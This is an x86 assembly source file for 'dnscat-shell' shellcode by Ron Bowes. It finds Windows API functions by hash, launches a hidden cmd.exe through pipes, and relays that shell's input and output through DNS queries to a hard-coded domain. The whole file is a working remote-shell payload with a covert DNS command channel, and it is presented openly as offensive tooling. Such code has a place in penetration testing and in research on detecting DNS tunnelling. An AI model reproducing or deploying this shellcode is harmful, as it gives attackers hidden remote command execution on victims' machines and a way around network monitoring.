; dnscat-shell.asm
; By Ron Bowes
; Created March, 2010
;
; (See LICENSE.txt)
;
BITS 32

 jmp bottom

top:
 pop ebp
 sub esp, 1024 ; Make room for some local storage

; Load kernel32.dll
call find_kernel32
xor ebx, ebx
add bl, 9 ; There are 9 kernel32.dll functions
mov edi, ebp ; First kernel32.dll function
call get_functions_internal

add bl, 6 ; There are 6 ws2_32.dll functions
lea edx, [ebp+84] ; 'ws2_32.dll'
lea edi, [ebp+36] ; First ws2_32.dll function
call get_functions

; Load dnsapi.dll
inc bl ; There is 1 dnsapi.dll function
lea edx, [ebp+96] ; 'dnsapi.dll'
lea edi, [ebp+60] ; First dnsapi.dll function
call get_functions

; Get the local DNS server
lea ecx, [esp+4]
or word [esp+6], 0x1010
mov dword [ecx], 32 
push ecx ; length (32 should be enough for any system)
add ecx, 4
push ecx ; buffer (use stack space)
xor ecx, ecx 
push ecx ; reserved
push ecx ; adapter name
push ecx ; flag
add cl, 6
push ecx ; DnsConfigDnsServerList
call [ebp+60]
; [esp+8] = number of system DNS servers
; [esp+12] = 1st, [esp+16] = 2nd, etc
mov eax, [esp+12] ; eax -> 1st DNS server
mov [ebp+116], eax


; Start winsock
lea ecx, [esp+4]
push ecx
xor ecx, ecx
add cx, 0x0202
push ecx
call [ebp+36] ; WSAStartup()

; socket(AF_INET, SOCK_DGRAM, 0)
push eax ; 0 (return code from WSAStartup())
add al, 2
push eax ; type = SOCK_DGRAM
push eax ; protocol = AF_INET
call [ebp+52] ; socket()
mov [ebp+64], eax ; udp socket

; ioctlsocket(s, FIONBIO, {1})
lea ecx, [esp+4]
;mov dword [ecx], 1 ; <-- Anything non-zero is fine
push ecx ; {1}
push 0x8004667e ; FIONBIO
push eax ; s
call [ebp+56] ; ioctlsocket()

; bind(s, sockaddr, 16)
;push 16 ; namelen
;lea ecx, [ebp+116]
;push ecx ; sockaddr
;push dword [ebp+64] ; socket
;call [ebp+48] ; bind()

; We need to zero out enough room for STARTUPINFOA (68 bytes), PROCESS_INFORMATION (16 bytes), and SECURITY_ATTRIBUTES (12 bytes) -- total 96
lea edi, [esp+4]
; xor eax, eax ; eax is already zero because of ioctlsocket()
xor ecx, ecx
add cl, 25
rep stosd

; Set the security attributes
add cl, 11
mov byte [esp+88+8], cl ; bInheritHandles
mov byte [esp+88], cl  ; nLength

; Create our pipes
lea ebx, [esp+88] ; ebx -> our SECURITY_ATTRIBUTES
lea esi, [ebp+72] ; esi -> ptr stdin write
lea edi, [ebp+80] ; edi -> ptr stdout write
xor ecx, ecx
push ecx ; nSize
push ebx ; sa
push esi ; ptr stdin write
add cl, 4
sub esi, ecx ; esi -> ptr stdin read
push esi ; ptr stdin read
call [ebp+8] ; CreatePipe()

xor ecx, ecx
push ecx ; nSize
push ebx ; sa
push edi ; stdout write
add cl, 4
sub edi, ecx ; edi -> ptr stdin read
push edi ; stdout read
call [ebp+8] ; CreatePipe()

; Dereference the pointers
mov esi, [esi] ; esi -> stdin read
mov edi, [edi+4] ; edi -> stdout write

; Set up the STARUPINFOA structure
xor edx, edx
or dl, 68
mov dword [esp+4], edx ; cb (startupinfo length = 68)
xor eax, eax
inc ah
mov dword [esp+4+44], eax ; flags = STARF_USESTDHANDLES
mov dword [esp+4+56], esi ; hStdInput = stdin (read)
mov dword [esp+4+60], edi ; hStdOutput = stdout (write)


; Create the process
lea ecx, [esp+4+edx]
push ecx ; lpProcessInfo
sub ecx, edx ; Note: watch out for changing stack
push ecx ; lpStartupInfo
xor edx, edx
push edx ; lpCurrentDirectory (NULL)
push edx ; lpEnvironment (NULL)
push 0x08000000 ; dwFlags (CREATE_NO_WINDOW)
inc edx
push edx ; bInheritHandles (TRUE)
push ebx ; threadAttributes (sa)
push ebx ; processAttributes (sa)
lea ecx, [ebp+108]
push ecx ; lpCommandLine
dec edx
push edx ; lpApplicationName (NULL)
call [ebp+12] ; CreateProcessA()

; Close the two handles we don't need
; Note: we don't really have to close the stdin handle
;push dword [ebp+68] ; stdin (read)
;call [ebp+4] ; CloseHandle
push dword [ebp+80] ; stdout (write)
call [ebp+4] ; CloseHandle

top_main:
 xor ebx, ebx

 ; Check if we have data waiting
 lea ecx, [esp+4] ; Length ptr
 lea edx, [esp+8] ; Buffer ptr
 push ebx ; lpBytesLeftThisMessage
 push ebx ; lpTotalBytesAvail
 push ecx ; lpBytesRead
 add bl, 4
 push ebx ; nBufferSize
 push edx ; lpBuffer
 push dword [ebp+76] ; hNamedPipe = stdout read
 call [ebp+28] ; PeekNamedPipe()
 test eax, eax
 jz done

 mov ecx, [esp+4]
 test ecx, ecx

 ; Read on process's stdout
 lea ecx, [esp+4] ; Length ptr
 lea edx, [esp+8] ; Buffer ptr
jz no_data

 xor ebx, ebx
 push ebx ; lpOverlapped
 push ecx ; lpNumberOfBytesRead
 add bl, 31
 push ebx ; nNumberOfBytesToRead (31)
 push edx ; lpBuffer
 push dword [ebp+76] ; hFile = stdout read
 call [ebp+20] ; ReadFile()
 test eax, eax
 jz done

 ; Encode it
 lea ecx, [esp+8]
 mov edx, [esp+4]
 call encode
 jmp do_send

no_data:
 xor ebx, ebx
 mov dword [ecx], ebx
 
do_send:
 ; Send data or no data
 mov eax, [ebp+116] ; end server
 mov ebx, [ebp+64] ; socket
 lea ecx, [esp+8] ; data
 mov edx, [esp+4] ; length
 shl edx, 1 ; double the length since we've encoded the data
 call send_packet

 ; Check if we've received anything
 xor ebx, ebx
 lea ecx, [esp+8]
 push ebx ; flags
 add bh, 2
 push ebx ; length = way too much room
 push ecx ; buf
 push dword [ebp+64] ; socket
 call [ebp+44] ; recv()
 test eax, eax
 jle delay_main

 ; Parse the response
 lea esi, [esp+8+12] ; start of first question 
 mov edi, [ebp+72] ; target -> stdin_write
 call parse ; Parse the data on the stack and send it to stdin_write
 
 ; Sleep for 500 ms -- TODO: only poll every X-th sleep or something
delay_main:
 push ebx ; ebx currently contains 512
 call [ebp+32] ; Sleep
jmp top_main

done:
add esp, 1024
ret

bottom:
 call top
 dd 0xEC0E4E8E ; [0] LoadLibraryA    [kernel32.dll]
 dd 0x0FFD97FB ; [4] CloseHandle ; Note: the first 16 bytes are disposable, once this gets going
 dd 0x170C8F80 ; [8] CreatePipe
 dd 0x16B3FE72 ; [12] CreateProcessA
 dd 0x73E2D87E ; [16] ExitProcess ; TODO: Delete!
 dd 0x10FA6516 ; [20] ReadFile
 dd 0xE80A791F ; [24] WriteFile
 dd 0xB407C411 ; [28] PeekNamedPipe
 dd 0xDB2D49B0 ; [32] Sleep

 dd 0x3BFCEDCB ; [36] WSAStartup     [ws2_32.dll]
 dd 0x5FA669A9 ; [40] sendto
 dd 0xE71819B6 ; [44] recv
 dd 0xC7701AA4 ; [48] bind
 dd 0x492F0B6E ; [52] socket
 dd 0xEDE29208 ; [56] ioctlsocket
 dd 0x291CC73E ; [60] DnsQueryConfig [dnsapi.dll]
 db 'AAAA'     ; [64] UDPSocket
 db 'BBBBCCCC' ; [68] stdin handles (read then write)
 db 'EEEEFFFF' ; [76] stdout handles (read then write)
 db 'ws2_32.dll',0,0 ; [84]
 db 'dnsapi.dll',0,0 ; [96]
 db 'cmd.exe',0 ; [108]
 db 'IIII' ; [116] DNS server

 ; local sockaddr_in [116]
; dw 0x0002 ; sin_family = AF_INET
; dw 0x0000 ; local port = any
; dd 0x0000000 ; local address = any
; db 'GGGGHHHH' ; Padding for the sockaddr_in


;;; parse()
; esi = start of the first question (12 bytes into the packet)
; edi = handle where we're sending the data
parse:
 ; Find the first null byte, which indicates that the question is over
 xor ecx, ecx
findnull:
 inc esi
 cmp byte [esi], cl
 jne findnull

 ; Add 5 to get past the null and the type/class
 add cl, 5
 add esi, ecx

 ; Check if the first bit in the echoed question is '1' -- that tells us the name is shrunk to one byte
 test byte [esi], 0x80
 jnz echo_encoded
 
echo_findnull:
 inc esi
 cmp byte [esi+1], 0x00 ; Check the next byte so in a second, we can add one to it to get past the null
 jne echo_findnull

echo_encoded:
 xor ecx, ecx
 add cl, 21 ; 1 to get past the last character, 11 more to get past the null (1), the class/type (4), the TTL (4), and the length (2) - 12; then 7 to get past the 'dnscat' string - 19; then 2 more for the final null and the section length 
 add cl, [byte esi+19] ; The length of the 'flags' string
 add esi, ecx

 ; Now we're on the section count string. Read it. 
 mov bl, byte [esi]
 and bl, 0x0F ; ebx => number of sections
 ; We should now be sitting on the length of the first section

parse_top:
 ; Check if we're out of sections, then decrement the count
 test bl, bl
 jz parse_end
 dec bl

 ; Read the size of this section
 inc esi
 movzx ebx, byte [esi] ; ebx -> size of this section

 parse_sub_top:
  ; Read the next two characters
  inc esi
  dec ebx
  mov ah, byte [esi] ; First nibble
  inc esi
  dec ebx
  mov al, byte [esi] ; Second nibble

  and ax, 0xDFDF ; Remove case
  sub ax, 0x4141 ; Make it a number instead of a character

  shl ah, 4
  or  al, ah
  mov [ebp], al ; Store it

  ; Write the character to our pipe
  xor edx, edx
  push edx ; lpOverlapped (NULL)
  lea ecx, [ebp+8] ; Scratch space
  push ecx ; lpNumberOfBytesWritten
  inc edx
  push edx ; nNumberOfBytesToWrite (1)
  push ebp ; nBuffer
  push edi ; hFile
  call [ebp+24] ; WriteFile

  test ebx, ebx
  jnz parse_sub_top
 jmp parse_top
parse_end:

 ret


;;; encode()
; Encodes in netbios-style, effectively doubling the length of the string
; This is actually done backwards, from the end, which lets us re-use the buffer
; ecx = data
; edx = length
encode:

 lea edi, [edx*2] ; edi now indexes the last encoded character

encode_top:
 dec edx
 mov ah, byte [ecx+edx] ; Get the left nibble
 mov al, byte [ecx+edx] ; Get the right nibble

 shr ah, 0x04
 and al, 0x0F
 add ax, 0x4141 ; Add 'A' to both sides

 dec edi
 mov byte [ecx+edi], al
 dec edi
 mov byte [ecx+edi], ah

 test edx, edx
 jnz encode_top

 ret


;;; send_packet()
; Send out the DNS packet. 
; eax = dns server
; ebx = socket
; ecx = data (encoded -- no more than 62 bytes)
; edx = length
send_packet_top:
 pop esi ; esi -> sockaddr
 lea edi, [esi+16] ; edi -> the packet

 ; Set the dns server
 mov [esi+4], eax

 push esi ; Preserve registers
 push edi

 test dl, dl
 jz send_packet_blank

 ; Add the length
 mov byte [edi+22], 0x31 ; #sections -> 1
 mov byte [edi+23], dl ; Store the length value

 ; Copy the encoded data into the packet
 mov esi, ecx ; esi -> (source) encoded data
 add edi, 24 ; edi -> (dest) start of packet's data
 mov ecx, edx ; ecx -> count
 rep movsb ; Move the data into the dns packet

 ; Calculate the updated length of the packet (edx is the encoded name, and there are 24 bytes before it including the length)
 lea edx, [edx+28] ; Add the length, and also the TYPE/CLASS from later)

 jmp send_packet_continue

send_packet_blank:
 ; edi has to point to the domain's start
 add edi, 22 ; edi -> #sections
 mov byte [edi], '0'
 inc edi ; edi -> start of domain
 mov edx, 27 ; edx -> length of packet (including the TYPE/CLASS from later)

send_packet_continue:

 ; Add the domain to the packet
 jmp long get_domain
get_domain_top:
 pop esi
 ; Increment the 'random' section (otherwise, we have caching issues)
 inc byte [esi+1] ; Increment the letter (I realize this isn't really randomness)
 cmp byte [esi+1], 'z' ; Make sure we aren't at the end
 jle testing
  mov byte [esi+1], 'a'
testing:
 
 xor ecx, ecx
domain_top:
 mov al, byte [esi+ecx] ; al -> the current byte of the domain
 mov byte [edi+ecx], al ; current byte in packet -> al
 inc ecx ; Increment the counter
 inc edx ; Increment the packet length
 test al, al
 jnz domain_top

 ; Add the domain type/class
 xor eax, eax
 inc ah
 mov word [edi+ecx+2], ax ; 0x0001 = IN
 add ah, 4
 mov word [edi+ecx], ax ; 0x0005 = CNAME
 ; Increment the packet length by 4 since we added 4 bytes
; add edx, 4 ; I rolled this add into an earlier addition

; Restore registers
 pop edi
 pop esi

 
 ; sendto()
 xor eax, eax
 add al, 16
 push eax  ; sockaddr length
 push esi  ; sockaddr
 xor al, al
 push eax  ; flags
 push edx  ; length
 push edi  ; packet
 push ebx  ; socket
 call [ebp+40] ; sendto()

 ret

send_packet:
 call send_packet_top
 ; Remote sockaddr
 dw 0x0002 ; sin_family = AF_INET
 dw 0x3500 ; remote port = any
 dd 0x41414141 ; remote address (will be changed)
 db 'AAAAAAAA' ; padding -- I likely don't need this
 ; dns packet
 db 0x12, 0x34 ; transaction id
 db 0x01, 0x00 ; flags
 db 0x00, 0x01 ; questions
 db 0x00, 0x00 ; answers
 db 0x00, 0x00 ; authority
 db 0x00, 0x00 ; additional
 db 0x06, 'dnscat' ; dnscat signature
 db 0x01, '0' ; flags
 db 0x01,  ; number of sections (note: we don't need the actual number, it'll be added)
 ; Note: Up to 62 bytes (plus the domain) of code/data below here is going ot get whacked. 

;;; get_functions()
; ebx = function count
; edi = Pointer to the start of the list
; edx = offset to name
; ebp = base ptr
get_functions:
 push edx ; Push the name
 call [ebp] ; LoadLibrary()

get_functions_internal: ; This is called directly for kernel32.dll
 mov edx, eax
get_functions_loop:
 push dword [edi+ebx*4-4]
 push edx
 call find_function
 mov [edi+ebx*4-4], eax ; Save the result
 dec ebx ; Decrement the counter
 jnz get_functions_loop ; Jump if we aren't done
ret

;;; find_kernel32()
; Get kernel32.dll using the 'topstack' method, discussed
; in Skape's paper "Understanding Windows Shellcode"
find_kernel32:
   push esi                      ; Save esi
   xor  esi, esi                 ; Zero esi
   mov  eax, [fs:esi + 0x4]      ; Extract TEB
   mov  eax, [eax - 0x1c]        ; Snag a function pointer that's 0x1c bytes into the stack
find_kernel32_base:
find_kernel32_base_loop:
   dec  eax                      ; Subtract to our next page
   xor  ax, ax                   ; Zero the lower half
   cmp  word [eax], 0x5a4d   ; Is this the top of kernel32?
   jne  find_kernel32_base_loop  ; Nope?  Try again.
find_kernel32_base_finished:
   pop  esi                      ; Restore esi
   ret                           ; Return (if not used inline)

;;; find_function()
; Get an arbitrary function from a library, also as discussed
; in Skape's paper
find_function:
pushad                               ;save all registers
mov     ebp,  [esp+0x24]             ;put base address of module that is being
                                     ;loaded in ebp
mov     eax,  [ebp  +  0x3c]         ;skip over MSDOS header
mov     edx,  [ebp  +  eax  +  0x78] ;go to export table and put relative address
                                     ;in edx
add     edx,  ebp                    ;add base address to it.
                                     ;edx = absolute address of export table
mov     ecx,  [edx  +  0x18]         ;set up counter ECX
                                     ;(how many exported items are in array ?)
mov     ebx,  [edx  +  0x20]         ;put names table relative offset in ebx
add     ebx,  ebp                    ;add base address to it.
                                     ;ebx = absolute address of names table

find_function_loop:
jecxz  find_function_finished        ;if ecx=0, then last symbol has been checked.
                                     ;(should never happen)
                                     ;unless function could not be found
dec     ecx                          ;ecx=ecx-1
mov     esi,  [ebx  +  ecx  *  4]    ;get relative offset of the name associated
                                     ;with the current symbol
                                     ;and store offset in esi
add     esi,  ebp                    ;add base address.
                                     ;esi = absolute address of current symbol

compute_hash:
xor     edi,  edi                    ;zero out edi
xor     eax,  eax                    ;zero out eax
cld                                  ;clear direction flag.
                                     ;will make sure that it increments instead of
                                     ;decrements when using lods*

compute_hash_again:
lodsb                                ;load bytes at esi (current symbol name)
                                     ;into al, + increment esi
test    al,  al                      ;bitwise test :
                                     ;see if end of string has been reached
jz       compute_hash_finished       ;if zero flag is set = end of string reached
ror     edi,  0xd                    ;if zero flag is not set, rotate current
                                     ;value of hash 13 bits to the right
add     edi,  eax                    ;add current character of symbol name
                                     ;to hash accumulator
jmp     compute_hash_again           ;continue loop

compute_hash_finished:

find_function_compare:
cmp     edi,  [esp  +  0x28]         ;see if computed hash matches requested hash (at esp+0x28)
jnz     find_function_loop           ;no match, go to next symbol
mov     ebx,  [edx  +  0x24]         ;if match : extract ordinals table
                                     ;relative offset and put in ebx
add     ebx,  ebp                    ;add base address.
                                     ;ebx = absolute address of ordinals address table
mov     cx,  [ebx  +  2  *  ecx]     ;get current symbol ordinal number (2 bytes)
mov     ebx,  [edx  +  0x1c]         ;get address table relative and put in ebx
add     ebx,  ebp                    ;add base address.
                                     ;ebx = absolute address of address table
mov     eax,  [ebx  +  4  *  ecx]    ;get relative function offset from its ordinal and put in eax
add     eax,  ebp                    ;add base address.
                                     ;eax = absolute address of function address
mov     [esp  +  0x1c],  eax         ;overwrite stack copy of eax so popad
                                     ;will return function address in eax
find_function_finished:
popad                                ;retrieve original registers.
                                     ;eax will contain function address
ret 8                                ;only needed if code was not used inline


get_domain: 
 call get_domain_top
 db 1, 'a' ; random
 db 12,'skullseclabs' ; <-- To modify domain, change this...
 db 3,'org' ; <-- and this. The number is the section length.
 db 0

end:
